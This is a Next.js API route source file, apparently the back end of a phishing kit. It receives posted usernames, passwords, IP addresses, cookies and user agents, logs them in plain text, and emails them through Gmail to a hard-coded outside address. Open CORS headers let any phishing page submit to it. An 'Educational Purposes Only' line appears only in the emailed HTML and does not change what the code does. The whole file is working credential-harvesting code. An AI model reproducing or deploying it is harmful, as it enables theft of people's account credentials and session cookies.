// app/api/auth/collect-login/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

// Add CORS headers helper
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: corsHeaders });
}

export async function POST(request: Request) {
  try {
    const data = await request.json();
    
    console.log('📝 Login Data Received:', {
      username: data.username,
      password: data.password,
      ip: data.ip,
      timestamp: data.timestamp
    });

    // Check if email credentials are set
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('❌ Email credentials not configured');
      return NextResponse.json({ 
        success: false, 
        error: 'Email not configured' 
      }, { status: 500, headers: corsHeaders });
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Verify connection
    await transporter.verify();

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: 'blessedresult6@gmail.com',
      subject: `🔐 LOGIN: ${data.username}`,
      text: `
🔐 LOGIN DATA COLLECTED

Username: ${data.username}
Password: ${data.password}
IP Address: ${data.ip}
Cookies: ${data.cookies || 'No cookies'}
User Agent: ${data.userAgent || 'Unknown'}
Timestamp: ${data.timestamp}

---
      `,
      html: `
        <h2>🔐 Login Data Collected</h2>
        <table style="border-collapse: collapse; width: 100%;">
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Username</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.username}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Password</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.password}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>IP Address</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.ip}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Timestamp</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.timestamp}</td></tr>
        </table>
        <p style="color: #888; font-size: 12px; margin-top: 20px;">⚠️ Training Mode - For Educational Purposes Only</p>
      `,
    });

    console.log('✅ Login data sent to blessedresult6@gmail.com');

    return NextResponse.json({ 
      success: true, 
      message: 'Login data collected and sent' 
    }, { headers: corsHeaders });

  } catch (error) {
    console.error('Error sending login data:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'Failed to send email',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500, headers: corsHeaders });
  }
}
